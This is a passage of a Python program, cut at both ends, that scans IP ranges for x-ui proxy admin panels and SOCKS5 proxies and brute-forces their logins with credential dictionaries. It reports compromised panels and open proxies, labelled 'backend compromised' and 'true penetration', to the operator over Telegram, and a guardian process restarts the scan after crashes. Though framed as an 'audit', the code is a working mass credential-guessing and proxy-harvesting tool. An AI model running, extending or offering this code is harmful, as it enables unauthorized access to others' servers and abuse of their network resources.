        return 0

    if "/" in target:
        try:
            net = ipaddress.ip_network(target, strict=False)
            if net.num_addresses <= 1:
                return 1
            if isinstance(net, ipaddress.IPv4Network):
                if net.prefixlen >= 31:
                    return int(net.num_addresses)
                return max(0, int(net.num_addresses) - 2)
            return max(1, int(net.num_addresses) - 1)
        except ValueError:
            pass

    if "-" in target:
        left, right = target.split("-", 1)
        left = left.strip()
        right = right.strip()

        try:
            start_ip = ipaddress.ip_address(left)
            end_ip = ipaddress.ip_address(right)
            if start_ip.version == end_ip.version and int(end_ip) >= int(start_ip):
                return int(end_ip) - int(start_ip) + 1
        except ValueError:
            pass

        try:
            start_ip = ipaddress.ip_address(left)
            if start_ip.version == 4 and right.isdigit():
                start_last = int(left.split(".")[-1])
                end_last = int(right)
                if 0 <= end_last <= 255 and end_last >= start_last:
                    return end_last - start_last + 1
        except ValueError:
            pass

    return 1


def prompt_int(msg, default, min_value=None, max_value=None):
    while True:
        raw = input(msg).strip()
        if not raw:
            return default
        try:
            value = int(raw)
        except ValueError:
            print("输入无效，请输入整数。")
            continue
        if min_value is not None and value < min_value:
            print(f"输入过小。")
            continue
        if max_value is not None and value > max_value:
            print(f"输入过大。")
            continue
        return value


def prompt_float(msg, default, min_value=None):
    while True:
        raw = input(msg).strip()
        if not raw:
            return default
        try:
            value = float(raw)
        except ValueError:
            print("输入无效，请输入数字。")
            continue
        if min_value is not None and value < min_value:
            print(f"输入过小。")
            continue
        return value


def timed_input(prompt, timeout_sec=10.0):
    if timeout_sec <= 0:
        return input(prompt)

    if os.name == "nt":
        import msvcrt

        sys.stdout.write(prompt)
        sys.stdout.flush()
        buf = []
        deadline = time.time() + timeout_sec
        while time.time() < deadline:
            if msvcrt.kbhit():
                ch = msvcrt.getwch()
                if ch in ("\r", "\n"):
                    sys.stdout.write("\n")
                    sys.stdout.flush()
                    return "".join(buf)
                if ch == "\003":
                    raise KeyboardInterrupt
                if ch in ("\b", "\x7f"):
                    if buf:
                        buf.pop()
                        sys.stdout.write("\b \b")
                        sys.stdout.flush()
                    continue
                if ch in ("\x00", "\xe0"):
                    if msvcrt.kbhit():
                        msvcrt.getwch()
                    continue
                buf.append(ch)
                sys.stdout.write(ch)
                sys.stdout.flush()
            else:
                time.sleep(0.05)
        sys.stdout.write("\n")
        sys.stdout.flush()
        return ""

    sys.stdout.write(prompt)
    sys.stdout.flush()
    rlist, _, _ = select.select([sys.stdin], [], [], timeout_sec)
    if rlist:
        return sys.stdin.readline().rstrip("\n")
    sys.stdout.write("\n")
    sys.stdout.flush()
    return ""


def poll_zero_to_back(timeout_sec=0.5):
    if timeout_sec <= 0:
        return False

    if os.name == "nt":
        import msvcrt

        deadline = time.time() + timeout_sec
        while time.time() < deadline:
            if msvcrt.kbhit():
                ch = msvcrt.getwch()
                if ch in ("\x00", "\xe0"):
                    if msvcrt.kbhit():
                        msvcrt.getwch()
                    continue
                if ch == "0":
                    return True
                if ch in ("\r", "\n"):
                    continue
            else:
                time.sleep(0.05)
        return False

    rlist, _, _ = select.select([sys.stdin], [], [], timeout_sec)
    if not rlist:
        return False
    try:
        raw = sys.stdin.readline().strip()
    except Exception:
        return False
    return raw == "0"


def poll_action_key(timeout_sec=0.5, keys=("0",)):
    allowed = set(keys or ())
    if timeout_sec <= 0:
        return None

    if os.name == "nt":
        import msvcrt

        deadline = time.time() + timeout_sec
        while time.time() < deadline:
            if msvcrt.kbhit():
                ch = msvcrt.getwch()
                if ch in ("\x00", "\xe0"):
                    if msvcrt.kbhit():
                        msvcrt.getwch()
                    continue
                if ch in allowed:
                    return ch
                if ch in ("\r", "\n"):
                    continue
            else:
                time.sleep(0.05)
        return None

    rlist, _, _ = select.select([sys.stdin], [], [], timeout_sec)
    if not rlist:
        return None
    try:
        raw = sys.stdin.readline().strip()
    except Exception:
        return None
    return raw if raw in allowed else None


def wait_for_zero_return(prompt="输入 0 返回主菜单: "):
    while True:
        if input(prompt).strip() == "0":
            return
        print("请输入 0 返回。")


def get_available_memory_mb():
    if os.name == "nt":

        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]

        stat = MEMORYSTATUSEX()
        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat)):
            return stat.ullAvailPhys / 1024 / 1024
        return None

    if sys.platform.startswith("freebsd"):
        try:
            page_size = int(
                subprocess.check_output(
                    ["sysctl", "-n", "hw.pagesize"], text=True
                ).strip()
            )
            free_pages = int(
                subprocess.check_output(
                    ["sysctl", "-n", "vm.stats.vm.v_free_count"], text=True
                ).strip()
            )
            inactive_pages = int(
                subprocess.check_output(
                    ["sysctl", "-n", "vm.stats.vm.v_inactive_count"], text=True
                ).strip()
            )
            cache_pages = int(
                subprocess.check_output(
                    ["sysctl", "-n", "vm.stats.vm.v_cache_count"], text=True
                ).strip()
            )
            return (
                (page_size * (free_pages + inactive_pages + cache_pages)) / 1024 / 1024
            )
        except (OSError, ValueError, subprocess.CalledProcessError):
            return None

    meminfo = "/proc/meminfo"
    if os.path.exists(meminfo):
        try:
            with open(meminfo, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    if line.startswith("MemAvailable:"):
                        return int(line.split()[1]) / 1024
        except OSError:
            return None
    return 1024.0


def get_total_memory_mb():
    if os.name == "nt":

        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]

        stat = MEMORYSTATUSEX()
        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat)):
            return stat.ullTotalPhys / 1024 / 1024
        return None

    meminfo = "/proc/meminfo"
    if os.path.exists(meminfo):
        try:
            with open(meminfo, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    if line.startswith("MemTotal:"):
                        return int(line.split()[1]) / 1024
        except OSError:
            return None
    return None


def get_cpu_usage_percent():
    if os.name == "nt":

        class FILETIME(ctypes.Structure):
            _fields_ = [
                ("dwLowDateTime", ctypes.c_ulong),
                ("dwHighDateTime", ctypes.c_ulong),
            ]

        idle_t, kernel_t, user_t = FILETIME(), FILETIME(), FILETIME()
        ok = ctypes.windll.kernel32.GetSystemTimes(
            ctypes.byref(idle_t), ctypes.byref(kernel_t), ctypes.byref(user_t)
        )
        if not ok:
            return None

        def to_int(ft):
            return (ft.dwHighDateTime << 32) | ft.dwLowDateTime

        idle = to_int(idle_t)
        kernel = to_int(kernel_t)
        user = to_int(user_t)
        total = kernel + user

        prev = getattr(get_cpu_usage_percent, "_win_prev", None)
        setattr(get_cpu_usage_percent, "_win_prev", (idle, total))
        if not prev:
            return None
        idle_delta = idle - prev[0]
        total_delta = total - prev[1]
        if total_delta <= 0:
            return None
        return max(0.0, min(100.0, (1.0 - idle_delta / total_delta) * 100.0))

    proc_stat = "/proc/stat"
    if os.path.exists(proc_stat):
        try:
            with open(proc_stat, "r", encoding="utf-8", errors="replace") as f:
                line = f.readline().strip()
            if not line.startswith("cpu "):
                return None
            vals = [int(x) for x in line.split()[1:]]
            idle = vals[3] + (vals[4] if len(vals) > 4 else 0)
            total = sum(vals)
            prev = getattr(get_cpu_usage_percent, "_linux_prev", None)
            setattr(get_cpu_usage_percent, "_linux_prev", (idle, total))
            if not prev:
                return None
            idle_delta = idle - prev[0]
            total_delta = total - prev[1]
            if total_delta <= 0:
                return None
            return max(0.0, min(100.0, (1.0 - idle_delta / total_delta) * 100.0))
        except (OSError, ValueError):
            return None

    try:
        load = os.getloadavg()[0]
        cpu_count = max(1, os.cpu_count() or 1)
        return max(0.0, min(100.0, (load / cpu_count) * 100.0))
    except (OSError, AttributeError):
        return None


class AdaptiveLimiter:
    def __init__(self, capacity):
        self._capacity = max(1, int(capacity))
        self._in_use = 0
        self._cv = asyncio.Condition()

    async def acquire(self):
        async with self._cv:
            while self._in_use >= self._capacity:
                await self._cv.wait()
            self._in_use += 1

    async def release(self):
        async with self._cv:
            if self._in_use > 0:
                self._in_use -= 1
            self._cv.notify_all()

    async def set_capacity(self, capacity):
        async with self._cv:
            self._capacity = max(1, int(capacity))
            self._cv.notify_all()

    async def snapshot(self):
        async with self._cv:
            return self._capacity, self._in_use

    async def __aenter__(self):
        await self.acquire()
        return self

    async def __aexit__(self, exc_type, exc, tb):
        await self.release()


def run_guardian(
    mode,
    work_mode,
    threads,
    ports_str,
    feed_int=0.05,
    check_interval=20,
    min_free_mb=256.0,
):
    def guardian_tg_push(text):
        cfg = load_telegram_config()
        if not (
            cfg.get("enabled")
            and bool(cfg.get("bot_token"))
            and bool(cfg.get("chat_id"))
        ):
            return
        ok, detail = send_telegram_message(
            cfg.get("bot_token", ""), cfg.get("chat_id", ""), text
        )
        if not ok:
            log_event(f"Guardian Telegram failed: {detail}")

    save_state(
        GUARDIAN_STATE_FILE,
        {
            "pid": os.getpid(),
            "status": "running",
            "mode": mode,
            "work_mode": work_mode,
            "threads": threads,
            "ports": ports_str,
            "updated_at": now_ts(),
            "min_free_mb": min_free_mb,
            "check_interval": check_interval,
            "feed_int": feed_int,
        },
    )
    log_event(
        f"Guardian started mode={mode} work_mode={work_mode} threads={threads} ports={ports_str} "
    )
    guardian_tg_push(
        f"【天才猫】\n守护已启动\n模式: {mode_label(mode)} / {work_mode_label(work_mode)}\n线程: {threads}\n端口: {ports_str}"
    )
    last_restart_ts = 0.0
    min_restart_gap = max(10.0, float(check_interval))
    crash_restart_delay = 60.0
    completed_notice_logged = False
    manual_stop_notice_logged = False
    notified_dead_pid = None
    pending_dead_pid = None
    pending_dead_since = 0.0
    while True:
        if not is_guardian_enabled():
            gs = load_state(GUARDIAN_STATE_FILE)
            gs["status"] = "stopped"
            gs["last_note"] = "disabled_by_user"
            gs["updated_at"] = now_ts()
            save_state(GUARDIAN_STATE_FILE, gs)
            break
        mem_mb = get_available_memory_mb()
        st = load_state(STATE_FILE)
        if not is_alive(st.get("pid")):
            dead_pid = st.get("pid")
            st_status = str(st.get("status", "")).lower()
            if st_status == "completed":
                if not completed_notice_logged:
                    log_event(
                        "Guardian idle: last audit completed, waiting manual restart"
                    )
                    guardian_tg_push(
                        "【天才猫】\n守护待机\n上次任务已完成，等待手动启动"
                    )
                    completed_notice_logged = True
                gs = load_state(GUARDIAN_STATE_FILE)
                gs["updated_at"] = now_ts()
                gs["last_free_mb"] = mem_mb
                gs["last_note"] = "idle_completed"
                save_state(GUARDIAN_STATE_FILE, gs)
                time.sleep(check_interval)
                continue

            if st_status in ("manual_stopped", "stopped_manual"):
                if not manual_stop_notice_logged:
                    log_event(
                        "Guardian idle: audit stopped manually, waiting manual restart"
                    )
                    guardian_tg_push(
                        "【天才猫】\n守护待机\n检测到手动停止，不自动拉起；等待手动启动"
                    )
                    manual_stop_notice_logged = True
                gs = load_state(GUARDIAN_STATE_FILE)
                gs["updated_at"] = now_ts()
                gs["last_free_mb"] = mem_mb
                gs["last_note"] = "idle_manual_stop"
                save_state(GUARDIAN_STATE_FILE, gs)
                time.sleep(check_interval)
                continue

            if dead_pid != pending_dead_pid:
                pending_dead_pid = dead_pid
                pending_dead_since = now_ts()
                if dead_pid and dead_pid != notified_dead_pid:
                    guardian_tg_push(
                        f"【天才猫】\n审计进程异常退出\nPID: {dead_pid}\n状态: {st_status or '-'}\n将在 60 秒后尝试重启"
                    )
                    notified_dead_pid = dead_pid

            if mem_mb is None or mem_mb >= min_free_mb:
                now = now_ts()
                if (
                    pending_dead_since > 0
                    and now - pending_dead_since >= crash_restart_delay
                    and now - last_restart_ts >= min_restart_gap
                ):
                    subprocess.Popen(
                        [
                            sys.executable,
                            __file__,
                            "run",
                            str(mode),
                            str(work_mode),
                            str(threads),
                            ports_str,
                            str(feed_int),
                        ],
                        start_new_session=True,
                    )
                    last_restart_ts = now
                    guardian_tg_push(
                        f"【天才猫】\n守护已重启审计进程\n模式: {mode_label(mode)} / {work_mode_label(work_mode)}\n线程: {threads}"
                    )
                    completed_notice_logged = False
                    manual_stop_notice_logged = False
                    pending_dead_pid = None
                    pending_dead_since = 0.0
            else:
                log_event(
                    f"Guardian wait: low memory {mem_mb:.0f}MB < {min_free_mb:.0f}MB"
                )
        else:
            completed_notice_logged = False
            manual_stop_notice_logged = False
            notified_dead_pid = None
            pending_dead_pid = None
            pending_dead_since = 0.0
        gs = load_state(GUARDIAN_STATE_FILE)
        gs["updated_at"] = now_ts()
        gs["last_free_mb"] = mem_mb
        save_state(GUARDIAN_STATE_FILE, gs)
        time.sleep(check_interval)


# ==================== 审计核心 (逻辑不变，输出格式显密) ====================


async def audit_xui(
    ip,
    port,
    tokens,
    state,
    state_lock,
    work_mode,
    conn_limiter,
    token_sem=None,
):
    async def fetch_page(path, use_ssl=False, method="GET", payload=""):
        writer = None
        try:
            ssl_ctx = ssl.create_default_context() if use_ssl else None
            if ssl_ctx is not None:
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE
            async with conn_limiter:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port, ssl=ssl_ctx if use_ssl else None),
                    timeout=3.5,
                )
            ua = random.choice(USER_AGENTS)
            if method == "GET":
                req = f"GET {path} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\nConnection: close\r\n\r\n"
            else:
                req = f"POST {path} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(payload)}\r\nConnection: close\r\n\r\n{payload}"
            writer.write(req.encode("utf-8", errors="ignore"))
            await writer.drain()
            return await asyncio.wait_for(reader.read(16384), timeout=4.0)
        except Exception:
            return b""
        finally:
            await close_writer(writer)

    def match_xui(data):
        low = data.lower()
        if b"x-ui" in low or b"3x-ui" in low or b"/xui" in low:
            return True
        if b"/login" in low and (
            b"username" in low or b"password" in low or b"signin" in low
        ):
            return True
        if b"/assets/ant-design-vue/antd.min.css" in low and (
            b"/assets/css/custom.min.css" in low
            or b"/assets/element-ui/theme-chalk/display.css" in low
        ):
            return True
        if b"-welcome</title>" in low and b"/assets/js/" in low:
            return True
        return False

    def check_auth_success(data):
        low = data.lower()
        no_space = low.replace(b" ", b"")
        if b'"success":true' in no_space:
            return True
        if b"set-cookie:session=" in no_space:
            return True
        if b"set-cookie:x-ui" in no_space:
            return True
        if b"http/1.1302" in no_space and b"location:/panel" in no_space:
            return True
        return False

    probes_to_try = [("/", False), ("/login", False), ("/", True), ("/login", True)]
    tried = set()
    found_candidates = []
    counted_xui_found = False

    while probes_to_try:
        path, use_ssl = probes_to_try.pop(0)
        if (path, use_ssl) in tried:
            continue
        tried.add((path, use_ssl))
        data = await fetch_page(path, use_ssl=use_ssl)
        if not data:
            continue

        loc_match = re.search(rb"Location:\s*([^\r\n]+)", data, re.IGNORECASE)
        if loc_match:
            loc = loc_match.group(1).decode("utf-8", "ignore").strip()
            if loc.startswith("/") and (loc, use_ssl) not in tried:
                probes_to_try.append((loc, use_ssl))

        if match_xui(data):
            proto = "https" if use_ssl else "http"
            country, asn = get_geo_info(ip)
            login_path = path if "login" in path else path.rstrip("/") + "/login"
            candidate = (proto, use_ssl, country, asn, login_path)
            if candidate not in found_candidates:
                found_candidates.append(candidate)
            if (not counted_xui_found) and work_mode in (1, 2):
                async with state_lock:
                    state["xui_found"] += 1
                counted_xui_found = True
            if work_mode == 1:
                return f"[XUI_FOUND] [资产-面板存活] {ip}:{port} | {country} | {asn} | 协议:{proto} 路径:{path}"
            continue

    if found_candidates and tokens:
        verify_state_snapshot = None
        async with state_lock:
            state["verifying_ip_count"] = state.get("verifying_ip_count", 0) + 1
            verify_state_snapshot = dict(state)
        if verify_state_snapshot is not None:
            save_state(STATE_FILE, verify_state_snapshot)
        try:
            for proto, use_ssl, country, asn, login_path in found_candidates:
                for u, p in tokens:
                    payload = f"username={urllib.parse.quote(u)}&password={urllib.parse.quote(p)}"
                    if token_sem is not None:
                        async with token_sem:
                            login_resp = await fetch_page(
                                login_path,
                                use_ssl=use_ssl,
                                method="POST",
                                payload=payload,
                            )
                    else:
                        login_resp = await fetch_page(
                            login_path, use_ssl=use_ssl, method="POST", payload=payload
                        )
                    if check_auth_success(login_resp):
                        async with state_lock:
                            state["xui_verified"] += 1
                        return f"[XUI_VERIFIED] [高危-后台沦陷] {ip}:{port} | 账号:{u} | 密码:{mask_secret(p)} | {country} | {asn} | 登录成功({proto})"
        finally:
            verify_state_snapshot = None
            async with state_lock:
                state["verifying_ip_count"] = max(
                    0, state.get("verifying_ip_count", 0) - 1
                )
                verify_state_snapshot = dict(state)
            if verify_state_snapshot is not None:
                save_state(STATE_FILE, verify_state_snapshot)

        if work_mode == 2:
            proto, _, country, asn, _ = found_candidates[0]
            return f"[XUI_FOUND] [资产-面板存活] {ip}:{port} | {country} | {asn} | 字典未命中({proto})"
    return None


async def audit_socks5(
    ip,
    port,
    tokens,
    state,
    state_lock,
    work_mode,
    conn_limiter,
    token_sem=None,
):
    async def check_l7(reader, writer):
        try:
            req = b"GET / HTTP/1.1\r\nHost: 1.1.1.1\r\nUser-Agent: curl/7.68.0\r\nConnection: close\r\n\r\n"
            writer.write(req)
            await writer.drain()
            res = await asyncio.wait_for(reader.read(1024), timeout=3.0)
            if b"HTTP/1." in res or b"301 Moved" in res or b"<html>" in res.lower():
                return True
        except Exception:
            pass
        return False

    writer = None
    try:
        async with conn_limiter:
            r, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=3.0
            )
        writer.write(b"\x05\x02\x00\x02")
        await writer.drain()
        res = await asyncio.wait_for(r.readexactly(2), timeout=2.0)
        if not res or len(res) < 2 or res[0] != 5:
            return None

        if res[1] == 0x00:
            if work_mode in (1, 2):
                async with state_lock:
                    state["s5_found"] += 1
            country, asn = get_geo_info(ip)
            if work_mode == 1:
                return f"[S5_FOUND] [节点-可连通] {ip}:{port} | S5-OPEN | {country} | {asn}"

            await close_writer(writer)
            async with conn_limiter:
                r2, w2 = await asyncio.wait_for(
                    asyncio.open_connection(ip, port), timeout=2.5
                )
            try:
                start = time.perf_counter()
                w2.write(b"\x05\x01\x00\x01\x01\x01\x01\x01\x00\x50")
                await w2.drain()
                ack = await asyncio.wait_for(r2.read(10), timeout=2.5)
                if ack and len(ack) >= 2 and ack[1] == 0x00:
                    lat = int((time.perf_counter() - start) * 1000)
                    l7_ok = await check_l7(r2, w2)
                    if l7_ok:
                        async with state_lock:
                            state["s5_verified"] += 1
                        return f"[S5_VERIFIED] [优质-真穿透] {ip}:{port} | S5-OPEN | {country} | {asn} | RTT:{lat}ms"
                    elif work_mode in (2, 3):
                        return f"[S5_FOUND] [节点-可连通] {ip}:{port} | S5-OPEN | {country} | {asn} | 无L7能力"
            finally:
                await close_writer(w2)

        if res[1] == 0x02 and tokens:
            if work_mode in (1, 2):
                async with state_lock:
                    state["s5_found"] += 1
            country, asn = get_geo_info(ip)
            if work_mode == 1:
                return f"[S5_FOUND] [资产-加密节点] {ip}:{port} | S5-AUTH | {country} | {asn}"

            await close_writer(writer)
            verify_state_snapshot = None
            async with state_lock:
                state["verifying_ip_count"] = state.get("verifying_ip_count", 0) + 1
                verify_state_snapshot = dict(state)
            if verify_state_snapshot is not None:
                save_state(STATE_FILE, verify_state_snapshot)
            try:
                for u, p in tokens:
                    w3 = None
                    try:
                        async with conn_limiter:
                            r3, w3 = await asyncio.wait_for(
                                asyncio.open_connection(ip, port), timeout=2.0
                            )
                        if token_sem is not None:
                            async with token_sem:
                                w3.write(b"\x05\x01\x02")
                                await w3.drain()
                                await r3.readexactly(2)
                                ub = u.encode("utf-8", errors="ignore")
                                pb = p.encode("utf-8", errors="ignore")
                                if len(ub) > 255 or len(pb) > 255:
                                    continue
                                w3.write(
                                    b"\x01"
                                    + bytes([len(ub)])
                                    + ub
                                    + bytes([len(pb)])
                                    + pb
                                )
                                await w3.drain()
                                auth = await asyncio.wait_for(
                                    r3.readexactly(2), timeout=2.0
                                )
                        else:
                            w3.write(b"\x05\x01\x02")
                            await w3.drain()
                            await r3.readexactly(2)
                            ub = u.encode("utf-8", errors="ignore")
                            pb = p.encode("utf-8", errors="ignore")
                            if len(ub) > 255 or len(pb) > 255:
                                continue
                            w3.write(
                                b"\x01" + bytes([len(ub)]) + ub + bytes([len(pb)]) + pb
                            )
                            await w3.drain()
                            auth = await asyncio.wait_for(
                                r3.readexactly(2), timeout=2.0
                            )
                        if auth and len(auth) >= 2 and auth[1] == 0x00:
                            start = time.perf_counter()
                            w3.write(b"\x05\x01\x00\x01\x01\x01\x01\x01\x00\x50")
                            await w3.drain()
                            ack = await asyncio.wait_for(r3.read(10), timeout=2.5)
                            l7_ok = False
                            lat = 0
                            if ack and len(ack) >= 2 and ack[1] == 0x00:
                                lat = int((time.perf_counter() - start) * 1000)
                                l7_ok = await check_l7(r3, w3)

                            if l7_ok:
                                async with state_lock:
                                    state["s5_verified"] += 1
                                return f"[S5_VERIFIED] [优质-真穿透] {ip}:{port} | 账号:{u} | 密码:{mask_secret(p)} | S5-AUTH | {country} | {asn} | RTT:{lat}ms"
                            elif work_mode in (2, 3):
                                return f"[S5_FOUND] [节点-可连通] {ip}:{port} | 账号:{u} | 密码:{mask_secret(p)} | S5-AUTH | {country} | {asn} | 无L7能力"
                    except (
                        asyncio.TimeoutError,
                        asyncio.IncompleteReadError,
                        OSError,
                        ValueError,
                    ):
                        continue
                    finally:
                        await close_writer(w3)
            finally:
                verify_state_snapshot = None
                async with state_lock:
                    state["verifying_ip_count"] = max(
                        0, state.get("verifying_ip_count", 0) - 1
                    )
                    verify_state_snapshot = dict(state)
                if verify_state_snapshot is not None:
                    save_state(STATE_FILE, verify_state_snapshot)

            if work_mode in (2, 3):
                return f"[S5_FOUND] [节点-可连通] {ip}:{port} | S5-AUTH | {country} | {asn} | 字典未命中"
    except (asyncio.TimeoutError, asyncio.IncompleteReadError, OSError, ValueError):
        pass
    finally:
        await close_writer(writer)
    return None


# ==================== 后台调度 ====================


async def internal_audit_process(mode, work_mode, threads, ports, feed_int):
    ports_raw = ",".join(str(p) for p in ports)
    state = {
        "status": "running",
        "pid": os.getpid(),
        "mode": mode,
        "threads": threads,
        "ports_raw": ports_raw,
        "parse_est_total": 0,
        "total": 0,
        "done": 0,
        "fed": 0,
        "feed_total": 0,
        "feed_interval": feed_int,
        "xui_found": 0,
        "xui_verified": 0,
        "s5_found": 0,
        "s5_verified": 0,
        "verifying_ip_count": 0,
        "active_workers": 0,
        "queue_size": 0,
        "tokens_loaded": 0,
        "current_ip": "-",
        "current_service": "-",
        "current_port": "-",
        "work_mode": work_mode,
        "recent": [],
        "skipped_resume": 0,
        "skipped_history": 0,
        "feeding_done": False,
        "started_at": now_ts(),
        "current": "Initializing...",
    }
    save_state(STATE_FILE, state)
    state_lock = asyncio.Lock()
    flush_stop = asyncio.Event()
    resume_cfg = load_resume_config()
    resume_enabled = bool(resume_cfg.get("enabled", True))
    skip_scanned_enabled = bool(resume_cfg.get("skip_scanned", False))
    feed_cfg = load_feed_turbo_config()
    accel_trigger_ratio = float(
        feed_cfg.get("accel_trigger_ratio", FEED_ACCEL_TRIGGER_RATIO)
    )
    final_rush_ratio = float(feed_cfg.get("final_rush_ratio", FEED_FINAL_RUSH_RATIO))
    accel_factor = float(feed_cfg.get("accel_factor", FEED_ACCEL_FACTOR))
    session_key = f"{mode}|{work_mode}|{','.join(str(p) for p in ports)}"
    done_targets = set()
    if resume_enabled:
        cp = load_state(CHECKPOINT_FILE)
        if cp.get("session_key") == session_key:
            raw_done = cp.get("done_targets", [])
            if isinstance(raw_done, list):
                done_targets = {str(x) for x in raw_done if str(x).strip()}
    state["resume_enabled"] = resume_enabled
    state["skip_scanned_enabled"] = skip_scanned_enabled
    state["resume_restored"] = len(done_targets)
    state["feed_accel_trigger_ratio"] = accel_trigger_ratio
    state["feed_final_rush_ratio"] = final_rush_ratio
    state["feed_accel_factor"] = accel_factor
    tg_cfg = load_telegram_config()
    tg_enabled = (
        tg_cfg.get("enabled")
        and bool(tg_cfg.get("bot_token"))
        and bool(tg_cfg.get("chat_id"))
    )
    tg_interval_sec = max(0, int(tg_cfg.get("interval_minutes", 0))) * 60
    tg_condition_mode = int(tg_cfg.get("condition_mode", 2))
    tg_verified_threshold = int(tg_cfg.get("verified_threshold", 5))
    last_interval_push_ts = 0.0
    last_daily_push_date = ""
    last_quick_persist_ts = 0.0
    special_or_sent = False
    notify_tasks = set()
    last_checkpoint_saved_size = len(done_targets)
    last_checkpoint_saved_ts = now_ts()

    q = asyncio.Queue(maxsize=max(threads * 4, 4096))
    token_sem = asyncio.Semaphore(max(1, threads // 2))
    adaptive_min = min(ADAPT_MIN_CONCURRENCY, max(10, threads))
    adaptive_max = max(adaptive_min, min(threads, ADAPT_MAX_CONCURRENCY))
    socket_limit = max(50, min(MAX_SOCKET_CONCURRENCY, adaptive_max))
    conn_limiter = AdaptiveLimiter(socket_limit)
    state["socket_limit"] = socket_limit
    state["socket_in_use"] = 0
    state["free_mb"] = get_available_memory_mb()

    if mode == 3:
        xui_ports = parse_ports(DEFAULT_XUI_PORTS)
        s5_ports = parse_ports(DEFAULT_S5_PORTS)
    elif mode == 1:
        xui_ports = list(ports)
        s5_ports = []
    else:
        xui_ports = []
        s5_ports = list(ports)

    state["xui_ports_total"] = len(xui_ports)
    state["s5_ports_total"] = len(s5_ports)

    async def push_telegram(text):
        if not tg_enabled:
            return
        ok, detail = await send_telegram_message_async(
            tg_cfg["bot_token"], tg_cfg["chat_id"], text
        )
        if not ok:
            log_event(f"Telegram send failed: {detail}")

    def schedule_telegram(text):
        if not tg_enabled:
            return
        task = asyncio.create_task(push_telegram(text))
        notify_tasks.add(task)
        task.add_done_callback(lambda t: notify_tasks.discard(t))

    def should_push_condition(line):
        is_verified = is_verified_output_line(line)
        if tg_condition_mode == 0:
            return False
        if tg_condition_mode in (1, 2, 3, 4):
            return is_verified
        return False

    def build_interval_message(snapshot, verified_lines):
        xui_lines = [
            format_result_line(x, "xui")
            for x in verified_lines
            if "[XUI_VERIFIED]" in x or "[高危-后台沦陷]" in x
        ]
        s5_lines = [
            format_result_line(x, "socks5")
            for x in verified_lines
            if "[S5_VERIFIED]" in x or "[优质-真穿透]" in x
        ]
        return (
            f"【天才猫】\n"
            f"模式: {mode_label(mode)} / {work_mode_label(work_mode)}\n"
            f"验真成功: XUI {snapshot.get('xui_verified', 0)} | S5真穿透 {snapshot.get('s5_verified', 0)}\n"
            f"XUI:\n" + ("\n".join(xui_lines[-5:]) if xui_lines else "-") + "\n\n"
            f"S5:\n" + ("\n".join(s5_lines[-5:]) if s5_lines else "-")
        )

    def build_daily_verified_message(now_dt):
        xui_verified_24h, s5_verified_24h = collect_verified_last_24h(now_dt)
        xui_fmt = [format_result_line(x, "xui") for x in xui_verified_24h]
        s5_fmt = [format_result_line(x, "socks5") for x in s5_verified_24h]
        lines = []
        lines.append("【天才猫】")
        lines.append("每日验真汇总(近24小时)")
        lines.append(f"时间: {now_dt.strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"XUI 验真成功: {len(xui_fmt)}")
        lines.append(f"S5 验真成功: {len(s5_fmt)}")
        lines.append("")
        lines.append("XUI 明细:")
        lines.extend(xui_fmt[-20:] if xui_fmt else ["-"])
        lines.append("")
        lines.append("S5 明细:")
        lines.extend(s5_fmt[-20:] if s5_fmt else ["-"])
        return "\n".join(lines)

    async def flush_state_loop():
        nonlocal last_interval_push_ts, last_daily_push_date
        nonlocal last_checkpoint_saved_size, last_checkpoint_saved_ts
        last_checkpoint_ts = 0.0
        while not flush_stop.is_set():
            await asyncio.sleep(STATE_FLUSH_INTERVAL)
            now = now_ts()
            now_dt = datetime.now()
            should_send_interval = False
            should_send_daily = False
            snapshot = None
            recent_lines = []
            state_snapshot = None
            checkpoint_targets = None
            checkpoint_done = 0
            checkpoint_total = 0
            checkpoint_size = 0
            async with state_lock:
                state["queue_size"] = q.qsize()
                state_snapshot = dict(state)
                if (
                    resume_enabled
                    and now - last_checkpoint_ts >= CHECKPOINT_FLUSH_INTERVAL
                ):
                    done_size = len(done_targets)
                    done_now = state.get("done", 0)
                    total_now = state.get("total", 0)
                    reached_growth_step = (
                        done_size - last_checkpoint_saved_size
                    ) >= CHECKPOINT_GROWTH_STEP
                    reached_idle_flush = (
                        done_size != last_checkpoint_saved_size
                        and now - last_checkpoint_saved_ts
                        >= CHECKPOINT_MAX_IDLE_FLUSH_SEC
                    )
                    about_to_finish = done_now >= total_now and done_size > 0
                    if reached_growth_step or reached_idle_flush or about_to_finish:
                        checkpoint_targets = list(done_targets)
                        checkpoint_done = done_now
                        checkpoint_total = total_now
                        checkpoint_size = done_size
                    last_checkpoint_ts = now
                if (
                    tg_enabled
                    and tg_interval_sec > 0
